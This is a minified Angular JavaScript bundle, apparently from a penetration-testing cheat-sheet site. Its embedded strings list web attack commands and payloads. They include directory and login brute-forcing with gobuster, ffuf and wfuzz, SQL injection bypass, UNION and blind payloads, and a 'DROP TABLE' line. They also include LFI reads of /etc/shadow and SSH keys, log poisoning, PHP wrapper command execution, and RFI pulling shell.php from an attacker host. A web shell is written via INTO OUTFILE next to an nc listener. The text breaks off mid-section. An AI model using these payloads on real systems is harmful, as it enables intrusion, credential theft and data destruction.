import{a as E,b as v,c as T,e as y,f as P}from"./chunk-VFOKBMI4.js";import{e as I,f as w}from"./chunk-7BWD45GD.js";import{$a as x,Ha as b,La as S,Ua as s,Va as t,W as d,Wa as e,X as u,Xa as r,ab as f,bb as g,cb as h,db as l,mb as n,va as a}from"./chunk-ETCZ6OUV.js";function C(o,c){if(o&1){let i=g();t(0,"div")(1,"section",8)(2,"div",9),r(3,"span",10),t(4,"h2"),n(5,"RECONNAISSANCE"),e(),r(6,"span",10),e(),t(7,"div",11)(8,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("recon"))}),t(9,"div",13),n(10,">_"),e(),t(11,"div",14)(12,"h2"),n(13,"Recon"),e(),t(14,"p"),n(15,"Initial web reconnaissance and attack surface discovery."),e()()(),t(16,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("technology"))}),t(17,"div",13),n(18,"\u25C6"),e(),t(19,"div",14)(20,"h2"),n(21,"Technology"),e(),t(22,"p"),n(23,"Identify servers, frameworks, CMS and technologies."),e()()()()(),t(24,"section",8)(25,"div",9),r(26,"span",10),t(27,"h2"),n(28,"DISCOVERY"),e(),r(29,"span",10),e(),t(30,"div",11)(31,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("directories"))}),t(32,"div",13),n(33,"\u25A3"),e(),t(34,"div",14)(35,"h2"),n(36,"Directories"),e(),t(37,"p"),n(38,"Discover directories, files and hidden resources."),e()()()()(),t(39,"section",8)(40,"div",9),r(41,"span",10),t(42,"h2"),n(43,"AUTHENTICATION & ACCESS"),e(),r(44,"span",10),e(),t(45,"div",11)(46,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("authentication"))}),t(47,"div",13),n(48,"@"),e(),t(49,"div",14)(50,"h2"),n(51,"Authentication"),e(),t(52,"p"),n(53,"Login mechanisms, sessions and access control."),e()()()()(),t(54,"section",8)(55,"div",9),r(56,"span",10),t(57,"h2"),n(58,"INPUT & INJECTION"),e(),r(59,"span",10),e(),t(60,"div",11)(61,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("sqli"))}),t(62,"div",13),n(63,"!"),e(),t(64,"div",14)(65,"h2"),n(66,"SQL Injection"),e(),t(67,"p"),n(68,"SQL injection techniques, enumeration and exploitation."),e()()(),t(69,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("xss"))}),t(70,"div",13),n(71,"</>"),e(),t(72,"div",14)(73,"h2"),n(74,"XSS"),e(),t(75,"p"),n(76,"Reflected, stored and DOM-based XSS."),e()()(),t(77,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("file-upload"))}),t(78,"div",13),n(79,"\u2191"),e(),t(80,"div",14)(81,"h2"),n(82,"File Upload"),e(),t(83,"p"),n(84,"Upload validation and processing weaknesses."),e()()()()(),t(85,"section",8)(86,"div",9),r(87,"span",10),t(88,"h2"),n(89,"SERVER-SIDE"),e(),r(90,"span",10),e(),t(91,"div",11)(92,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("lfi"))}),t(93,"div",13),n(94,"\u2301"),e(),t(95,"div",14)(96,"h2"),n(97,"LFI / RFI"),e(),t(98,"p"),n(99,"Local and remote file inclusion."),e()()(),t(100,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("fileInclusions"))}),t(101,"div",13),n(102,"\u2301"),e(),t(103,"div",14)(104,"h2"),n(105,"File Inclusions"),e(),t(106,"p"),n(107,"LFI, RFI, PHP wrappers and log poisoning."),e()()(),t(108,"div",12),h("click",function(){d(i);let p=l();return u(p.selectWebSection("ssrf"))}),t(109,"div",13),n(110,"\u2197"),e(),t(111,"div",14)(112,"h2"),n(113,"SSRF"),e(),t(114,"p"),n(115,"Internal resources and server-side requests."),e()()()()()()}}function R(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"Recon"),e(),t(3,"p",17),n(4," Start by identifying the target's exposed web services, ports and applications before moving into deeper enumeration. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Port & Service Discovery "),e()(),r(9,"app-terminal",18),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," HTTP / HTTPS "),e()()(),f()),o&2){let i=l(2);a(9),s("command",i.webRecon)}}function O(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"Technology Identification"),e(),t(3,"p",17),n(4," Identify the technologies behind the application, including web servers, frameworks, CMS platforms and JavaScript components. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Technology Detection "),e()(),r(9,"app-terminal",18),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Headers & Responses "),e()(),r(14,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.webTechnology),a(5),s("command",i.webHeaders)}}function W(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"Directory & File Discovery"),e(),t(3,"p",17),n(4," Discover hidden directories, files, backups and other resources that are not directly linked from the application. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Gobuster "),e()(),r(9,"app-terminal",18),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Feroxbuster "),e()(),r(14,"app-terminal",18),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18," FFUF "),e()(),r(19,"app-terminal",18),e(),t(20,"mat-expansion-panel")(21,"mat-expansion-panel-header")(22,"mat-panel-title"),n(23," Wfuzz "),e()(),r(24,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.gobuster),a(5),s("command",i.feroxbusterCommands),a(5),s("command",i.ffufCommands),a(5),s("command",i.wfuzzCommands)}}function D(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"Authentication"),e(),t(3,"p",17),n(4," Identify login mechanisms, authentication weaknesses, session handling and access control issues. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Login Enumeration "),e()(),r(9,"app-terminal",18),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Session Testing "),e()(),r(14,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.webAuthentication),a(5),s("command",i.webSessions)}}function L(o,c){if(o&1&&(x(0),t(1,"mat-expansion-panel")(2,"mat-expansion-panel-header")(3,"mat-panel-title"),n(4,"Basic Concepts"),e()(),r(5,"app-terminal",18),e(),t(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),n(9,"Types of SQL Injection"),e()(),r(10,"app-terminal",18),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14,"Initial Testing Payloads"),e()(),r(15,"app-terminal",18),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19,"Filter Bypass Techniques"),e()(),r(20,"app-terminal",18),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24,"UNION-Based Injection"),e()(),r(25,"app-terminal",18),e(),t(26,"mat-expansion-panel")(27,"mat-expansion-panel-header")(28,"mat-panel-title"),n(29,"Blind SQL Injection"),e()(),r(30,"app-terminal",18),e(),t(31,"mat-expansion-panel")(32,"mat-expansion-panel-header")(33,"mat-panel-title"),n(34,"Useful SQL Functions"),e()(),r(35,"app-terminal",18),e(),t(36,"mat-expansion-panel")(37,"mat-expansion-panel-header")(38,"mat-panel-title"),n(39,"SQL Injection \u2192 RCE"),e()(),r(40,"app-terminal",18),e(),t(41,"mat-expansion-panel")(42,"mat-expansion-panel-header")(43,"mat-panel-title"),n(44,"Out-of-Band SQL Injection"),e()(),r(45,"app-terminal",18),e(),t(46,"mat-expansion-panel")(47,"mat-expansion-panel-header")(48,"mat-panel-title"),n(49,"Practical Exploitation Flow"),e()(),r(50,"app-terminal",18),e(),t(51,"mat-expansion-panel")(52,"mat-expansion-panel-header")(53,"mat-panel-title"),n(54,"Important Notes"),e()(),r(55,"app-terminal",18),e(),f()),o&2){let i=l(2);a(5),s("command",i.sqliConcepts),a(5),s("command",i.sqliTypes),a(5),s("command",i.sqliTesting),a(5),s("command",i.sqliFilterBypass),a(5),s("command",i.sqliUnion),a(5),s("command",i.sqliBlind),a(5),s("command",i.sqliEnumeration),a(5),s("command",i.sqliRce),a(5),s("command",i.sqliOob),a(5),s("command",i.sqliFlow),a(5),s("command",i.sqliNotes)}}function F(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"Cross-Site Scripting"),e(),t(3,"p",17),n(4," Identify reflected, stored and DOM-based XSS vulnerabilities in application inputs and client-side functionality. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Reflected XSS "),e()(),r(9,"app-terminal",18),e(),t(10,"mat-expansion-panel")(11,"mat-expansion-panel-header")(12,"mat-panel-title"),n(13," Stored XSS "),e()(),r(14,"app-terminal",18),e(),t(15,"mat-expansion-panel")(16,"mat-expansion-panel-header")(17,"mat-panel-title"),n(18," DOM XSS "),e()(),r(19,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.reflectedXss),a(5),s("command",i.storedXss),a(5),s("command",i.domXss)}}function U(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"File Upload"),e(),t(3,"p",17),n(4," Analyze file upload functionality, validation mechanisms and possible ways uploaded files may be processed by the application. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Upload Testing "),e()(),r(9,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.fileUpload)}}function Z(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"LFI / RFI"),e(),t(3,"p",17),n(4," Test file inclusion functionality for local and remote file inclusion vulnerabilities. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," Directory Traversal "),e()(),r(9,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.directoryTraversal)}}function z(o,c){if(o&1&&(x(0),t(1,"mat-expansion-panel")(2,"mat-expansion-panel-header")(3,"mat-panel-title"),n(4," LFI "),e()(),r(5,"app-terminal",18),e(),t(6,"mat-expansion-panel")(7,"mat-expansion-panel-header")(8,"mat-panel-title"),n(9," Log Poisoning "),e()(),r(10,"app-terminal",18),e(),t(11,"mat-expansion-panel")(12,"mat-expansion-panel-header")(13,"mat-panel-title"),n(14," PHP Wrappers "),e()(),r(15,"app-terminal",18),e(),t(16,"mat-expansion-panel")(17,"mat-expansion-panel-header")(18,"mat-panel-title"),n(19," RFI "),e()(),r(20,"app-terminal",18),e(),t(21,"mat-expansion-panel")(22,"mat-expansion-panel-header")(23,"mat-panel-title"),n(24," Workflow "),e()(),r(25,"app-terminal",18),e(),f()),o&2){let i=l(2);a(5),s("command",i.lfi),a(5),s("command",i.logPoisoning),a(5),s("command",i.phpWrappers),a(5),s("command",i.rfi),a(5),s("command",i.fileInclusionWorkflow)}}function k(o,c){if(o&1&&(x(0),t(1,"h2"),n(2,"SSRF"),e(),t(3,"p",17),n(4," Identify server-side request functionality and determine whether the application can access internal resources. "),e(),t(5,"mat-expansion-panel")(6,"mat-expansion-panel-header")(7,"mat-panel-title"),n(8," SSRF Testing "),e()(),r(9,"app-terminal",18),e(),f()),o&2){let i=l(2);a(9),s("command",i.ssrf)}}function A(o,c){if(o&1){let i=g();t(0,"div",15)(1,"button",16),h("click",function(){d(i);let p=l();return u(p.clearWebSection())}),n(2,"\u2190 Back to Web"),e(),S(3,R,14,1,"ng-container",6)(4,O,15,2,"ng-container",6)(5,W,25,4,"ng-container",6)(6,D,15,2,"ng-container",6)(7,L,56,11,"ng-container",6)(8,F,20,3,"ng-container",6)(9,U,10,1,"ng-container",6)(10,Z,10,1,"ng-container",6)(11,z,26,5,"ng-container",6)(12,k,10,1,"ng-container",6),e()}if(o&2){let i=l();a(3),s("ngIf",i.selectedWebSection==="recon"),a(),s("ngIf",i.selectedWebSection==="technology"),a(),s("ngIf",i.selectedWebSection==="directories"),a(),s("ngIf",i.selectedWebSection==="authentication"),a(),s("ngIf",i.selectedWebSection==="sqli"),a(),s("ngIf",i.selectedWebSection==="xss"),a(),s("ngIf",i.selectedWebSection==="file-upload"),a(),s("ngIf",i.selectedWebSection==="lfi"),a(),s("ngIf",i.selectedWebSection==="fileInclusions"),a(),s("ngIf",i.selectedWebSection==="ssrf")}}var _=class o{selectedWebSection=null;selectWebSection(c){this.selectedWebSection=c}clearWebSection(){this.selectedWebSection=null}webRecon=`
nmap -p- --min-rate 5000 <IP>
nmap -p80,443 -sC -sV <IP>

curl -I http://<IP>
curl -I https://<IP>
  `;webTechnology=`
whatweb http://<IP>
wappalyzer
nikto -h http://<IP>

curl -I http://<IP>
  `;webHeaders=`
curl -I http://<IP>
curl -s http://<IP> | head
  `;gobuster=`
# Directory brute force
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# Basic fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -t 50

# Search for common web extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
gobuster dir -u http://<IP>/ -w <WORDLIST> -x asp,aspx,ashx,asmx,config,txt -t 50

# Search for backup files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x bak,old,save,tmp,backup,orig,swp -t 50

# Search for compressed files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x zip,tar,gz,tgz,bz2,7z,rar -t 50

# Search for database files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x sql,db,db3,sqlite,sqlite3,dump -t 50

# Search for config and secret files
gobuster dir -u http://<IP>/ -w <WORDLIST> -x env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Search for Git and SVN repositories
gobuster dir -u http://<IP>/ -w <WORDLIST> -x git,svn -t 50

# Filtering (status codes)
gobuster dir -u http://<IP>/ -w <WORDLIST> -s 200,204,301,302,307,403 -t 50

# Exclude responses by length
gobuster dir -u http://<IP>/ -w <WORDLIST> --exclude-length 1234

# Hide negative status codes
gobuster dir -u http://<IP>/ -w <WORDLIST> -b 404,400

# Recursive fuzzing
gobuster dir -u http://<IP>/ -w <WORDLIST> -r

# Fuzzing parameters (GET)
gobuster dir -u "http://<IP>/<SUBDIRECTORY>/?FUZZ=1" -w <WORDLIST>

# Fuzzing auth pages (POST)
gobuster dir -u http://<IP>/<SUBDIRECTORY>/ -w <WORDLIST> -m POST --data 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -t 50

# Subdomain enumeration
gobuster dns -d mydomain.com -w <WORDLIST>

# Virtual hosting
gobuster vhost -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com'

# Virtual hosting with IP
gobuster vhost -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
/usr/share/seclists/Discovery/Web-Content/
/usr/share/seclists/Discovery/DNS/
/usr/share/wordlists/dirbuster/
/usr/share/seclists/Discovery/Web-Content/common.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
`;feroxbusterCommands=`# Full scan
feroxbuster -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -d 1

# Basic directory fuzzing
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,txt,html,js,json -t 50

# Linux / Apache / PHP extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e php,phtml,phps,php3,php4,php5,inc,txt,html,conf,ini,log -t 50

# Windows / IIS extensions
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e asp,aspx,ashx,asmx,config,txt -t 50

# Backup files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e bak,old,save,tmp,backup,orig,swp -t 50

# Compressed files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e zip,tar,gz,tgz,bz2,7z,rar -t 50

# Database files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e sql,db,db3,sqlite,sqlite3,dump -t 50

# Config / secret files
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> -e env,yaml,yml,json,xml,cfg,cnf,pem,key -t 50

# Recursive scanning
feroxbuster -u http://<IP>/ -w <WORDLIST> -r

# Recursive scan with depth limit
feroxbuster -u http://<IP>/ -w <WORDLIST> -d 2

# HTTPS with self-signed certificate
feroxbuster -u https://<IP>/ -k -w <WORDLIST>

# Filter status codes
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-status 404,400

# Filter response size
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-size 1234

# Filter words / lines
feroxbuster -u http://<IP>/FUZZ -w <WORDLIST> --filter-words 10 --filter-lines 5

# Extract links
feroxbuster -u http://<IP>/ -w <WORDLIST> -x js,php,html

# Save output
feroxbuster -u http://<IP>/ -w <WORDLIST> -o feroxbuster.txt

# JSON output
feroxbuster -u http://<IP>/ -w <WORDLIST> --json -o ferox.json

# Cookies
feroxbuster -u http://<IP>/ -w <WORDLIST> -C 'PHPSESSID=VALUE'

# Custom headers
feroxbuster -u http://<IP>/ -w <WORDLIST> -H 'Authorization: Bearer TOKEN'

# Custom User-Agent
feroxbuster -u http://<IP>/ -w <WORDLIST> -A 'Mozilla/5.0'

# GET parameter fuzzing
feroxbuster -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -w <WORDLIST> --filter-size 39

# POST parameter fuzzing
feroxbuster -u http://<IP>/<SUBDIRECTORY>/ -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' --filter-size 1435

# Subdomain enumeration
feroxbuster -u http://FUZZ.mydomain.com -w <WORDLIST> --filter-size 0

# Virtual hosting
feroxbuster -u http://mydomain.com -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --filter-size 0

# Virtual hosting with IP
feroxbuster -u http://<IP> -w <WORDLIST> -H 'Host: FUZZ.thm'

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/Web-Content/big.txt
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ .htaccess .htpasswd backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/`;ffufCommands=`# Basic fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -t 50

# Common web extensions
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.js,.json

# Backup files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .bak,.old,.save,.swp,.tmp,.backup,.orig

# Database files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .sql,.db,.db3,.sqlite,.sqlite3,.dump

# Config / secret files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .env,.conf,.cfg,.ini,.json,.xml,.yaml,.yml,.pem,.key

# Windows / IIS files
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .asp,.aspx,.config,.ashx,.asmx,.txt

# Filter status codes
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fc 404,400

# Filter response size
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fs 0

# Filter words / lines
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -fw 39 -fl 10

# GET parameter fuzzing
ffuf -u 'http://<IP>/<SUBDIRECTORY>/?FUZZ=1' -c -w <WORDLIST> -fs 39

# Multiple parameters
ffuf -u 'http://<IP>/page.php?FUZZ1=test&FUZZ2=test' -c -w <WORDLIST>

# POST parameter fuzzing
ffuf -u http://<IP>/<SUBDIRECTORY>/ -c -w <WORDLIST> -X POST -d 'uname=Dummy&passwd=FUZZ&submit=Submit' -H 'Content-Type: application/x-www-form-urlencoded' -fs 1435

# Login brute force
ffuf -u http://<IP>/login -X POST -d 'username=FUZZ&password=FUZZ2' -w users.txt:FUZZ,pass.txt:FUZZ2 -c -fs 1234

# Subdomain enumeration
ffuf -u http://FUZZ.mydomain.com -c -w <WORDLIST> -fs 0

# Virtual hosting
ffuf -u http://mydomain.com -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' -fs 0

# Virtual hosting with IP
ffuf -u http://<IP> -H 'Host: FUZZ.thm' -w <WORDLIST> -fs 0

# Recursive fuzzing
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -recursion

# Extensions + recursion
ffuf -c -u http://<IP>/FUZZ -w <WORDLIST> -e .php,.txt,.html,.bak,.old -recursion

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/
# /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Useful targets
# .git/ .git/config .git/HEAD .svn/ .hg/ backup/ backups/ dev/ test/ admin/ private/ db/ database/ config/ uploads/ api/ old/ tmp/ logs/ .env web.config`;wfuzzCommands=`# Basic directory / file fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/FUZZ

# File extension fuzzing
wfuzz -c -w <WORDLIST> -z list,php-txt-html-js-json-bak-old http://<IP>/FUZZ.FUZ2Z

# Hide 403 responses
wfuzz -c -w <WORDLIST> --hc 403 http://<IP>/FUZZ

# Hide multiple status codes
wfuzz -c -w <WORDLIST> --hc 403,404 http://<IP>/FUZZ

# Show only valid responses
wfuzz -c -w <WORDLIST> --sc 200,301,302,307,403 http://<IP>/FUZZ

# Filter by response size
wfuzz -c -w <WORDLIST> --hh 0 http://<IP>/FUZZ

# GET parameter fuzzing
wfuzz -c -w <WORDLIST> http://<IP>/<SUBDIRECTORY>/?FUZZ=1

# Multiple parameters
wfuzz -c -w users.txt -w pass.txt http://<IP>/login?user=FUZZ&pass=FUZ2Z

# POST parameter fuzzing
wfuzz -c -w <WORDLIST> -X POST -d 'uname=admin&passwd=FUZZ&submit=Submit' --hc 403 http://<IP>/<SUBDIRECTORY>/

# Login brute force
wfuzz -c -w users.txt -w passwords.txt -X POST -d 'username=FUZZ&password=FUZ2Z' --hc 401,403 http://<IP>/login

# Subdomain enumeration
wfuzz -c -w <WORDLIST> --hc 0 http://FUZZ.mydomain.com

# Virtual hosting
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.mydomain.com' --hc 0 http://mydomain.com

# Virtual hosting with IP
wfuzz -c -w <WORDLIST> -H 'Host: FUZZ.thm' http://<IP>

# Header fuzzing
wfuzz -c -w <WORDLIST> -H 'User-Agent: FUZZ' http://<IP>/

# Cookie fuzzing
wfuzz -c -w <WORDLIST> -b 'session=FUZZ' http://<IP>/

# Useful wordlists
# /usr/share/seclists/Discovery/Web-Content/
# /usr/share/seclists/Discovery/Web-Content/common.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
# /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
# /usr/share/seclists/Discovery/DNS/

# Useful targets
# .git/ .git/config .git/HEAD .svn/ backup/ backups/ admin/ test/ dev/ private/ db/ config/ uploads/ api/ .env web.config`;lfiInclusions=`
# Local File Inclusion (LFI)
# Vulnerable parameters may include:
# page=, file=, path=, doc=, include=, lang=, template=

# Basic LFI test
http://<IP>/index.php?page=../../../../etc/passwd

# Windows
http://<IP>/index.php?page=../../../../boot.ini

# Deep traversal
http://<IP>/index.php?page=../../../../../../../../etc/passwd

# Windows hosts file
http://<IP>/index.php?page=../../../../../../../../Windows/System32/drivers/etc/hosts

# Common useful files
/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/www/html/config.php
/var/log/apache2/access.log

# Windows
C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config

# Typical vulnerable code
include($_GET['page']);
`;logPoisoning=`
# Log Poisoning

# Common Linux logs
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/httpd/access_log
/var/log/nginx/access.log

# Common Windows logs
C:\\xampp\\apache\\logs\\access.log
C:\\xampp\\apache\\logs\\error.log
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\

# Step 1 - Inject PHP into the User-Agent
curl -A "<PHP_PAYLOAD>" http://<IP>/

# Step 2 - Include the poisoned log
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=id

# Step 3 - URL encode spaces if required
http://<IP>/index.php?page=../../../../../../../../../var/log/apache2/access.log&cmd=ls%20-la

# Windows
http://<IP>/index.php?page=../../../../../../../../xampp/apache/logs/access.log&cmd=dir
`;phpWrappers=`
# PHP Wrappers

# php://filter - Read source code
http://<IP>/index.php?page=php://filter/convert.base64-encode/resource=index.php

# Decode Base64
echo BASE64_OUTPUT | base64 -d

# data://
http://<IP>/index.php?page=data://text/plain,<PHP_PAYLOAD>

# Execute commands
http://<IP>/index.php?page=data://text/plain,<?php system('id'); ?>

# data:// Base64
http://<IP>/index.php?page=data://text/plain;base64,<BASE64_PAYLOAD>

# php://input
curl -X POST -d "<?php system('ls'); ?>" "http://<IP>/index.php?page=php://input"

# expect:// (if enabled)
http://<IP>/index.php?page=expect://id
`;rfi=`
# Remote File Inclusion (RFI)

# Requires allow_url_include=On

# Start HTTP server
python3 -m http.server 80

# Host the remote PHP file
http://<ATTACKER-IP>/shell.php

# Include remote file
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php

# Example with parameter
http://<IP>/index.php?page=http://<ATTACKER-IP>/shell.php&cmd=id

# Reverse shell
<PHP_REVERSHELL>
`;sqliConcepts=`
# SQL Injection - Basic Concepts

# Description
SQL Injection (SQLi) allows an attacker to manipulate SQL queries
through unsanitized user input.

# Example SQL query
SELECT * FROM users WHERE user_name='leon';

# Vulnerable PHP backend
$sql_query = "SELECT * FROM users WHERE user_name= '$uname' AND password='$passwd'";

# Core Mental Model
# 1. User input is concatenated into SQL query
# 2. Query structure becomes attacker-controlled
# 3. Goal is to change logic, extract data, or execute system actions
`;sqliTypes=`
# SQL Injection - Types

# Error-based SQLi
' OR 1=1 --

# Union-based SQLi
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

' UNION SELECT null, database(), user(), @@version --

' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --

# Blind SQL Injection

# Boolean-based
' AND 1=1 --
' AND 1=2 --

' AND IF(SUBSTRING(user(),1,1)='a',1,0) --

# Time-based
' AND IF(1=1, SLEEP(5), 0) --

# Stacked Queries
'; DROP TABLE users; --

# Requires support for multiple statements
`;sqliTesting=`
# SQL Injection - Initial Testing

# Authentication bypass
' OR 1=1 --
" OR 1=1 --
') OR 1=1 --

# Alternative comparisons
' OR '1'='1
" OR "1"="1

# Delay testing
' OR SLEEP(5) --
' AND SLEEP(5) --

# Comment styles
--
#
/* */
`;sqliFilterBypass=`
# SQL Injection - Filter Bypass

# Common bypass variations
' OR 1=1 -- -
' OR 1=1#
' OR '1'='1'--

# Whitespace bypass
'/**/OR/**/1=1--

# Encoding
%27 OR 1=1 --

# Case manipulation
' oR 1=1 --

# MySQL inline comments
'/*!OR*/1=1--
`;sqliUnion=`
# SQL Injection - UNION Based

# Requirements
# - Same number of columns
# - Compatible data types

# Find number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# Basic UNION payload
' UNION SELECT null,null,null --

# System enumeration
' UNION SELECT null, database(), user(), @@version --

# Schema enumeration
' UNION SELECT null, table_name, column_name
FROM information_schema.columns
WHERE table_schema=database() --
`;sqliBlind=`
# SQL Injection - Blind

# Boolean-based extraction
' AND SUBSTRING(user(),1,1)='a' --

# Character-by-character extraction
' AND ASCII(SUBSTRING(user(),1,1))=97 --

# Time-based extraction
' AND IF(ASCII(SUBSTRING(user(),1,1))=97, SLEEP(5), 0) --

# Boolean logic
' AND 1=1 --
' AND 1=2 --

# Time delay
' AND SLEEP(5) --
`;sqliEnumeration=`
# SQL Injection - Enumeration

# Current database
database()

# Current database user
user()

# Database version
@@version

# Current user
current_user()

# Version
version()

# Information schema
information_schema.tables
information_schema.columns

# Example
' UNION SELECT null, database(), user(), @@version --
`;sqliRce=`
# SQL Injection \u2192 RCE

# Core attack chain
SQLi
\u2192 DB Enumeration
\u2192 File Read / File Write / Command Execution
\u2192 Web Shell
\u2192 Reverse Shell
\u2192 System Access


# ==========================================
# LINUX - MYSQL / MARIADB
# ==========================================

# Read local files
SELECT LOAD_FILE('/etc/passwd');

# Useful targets
/etc/passwd
/etc/shadow
/var/www/html/config.php
/home/user/.ssh/id_rsa

# Write PHP web shell
SELECT '<?php system($_GET["cmd"]); ?>'
INTO OUTFILE '/var/www/html/shell.php';

# Trigger commands
http://TARGET/shell.php?cmd=id
http://TARGET/shell.php?cmd=whoami

# Listener
nc -lvnp 4444

# Trigger reverse shell
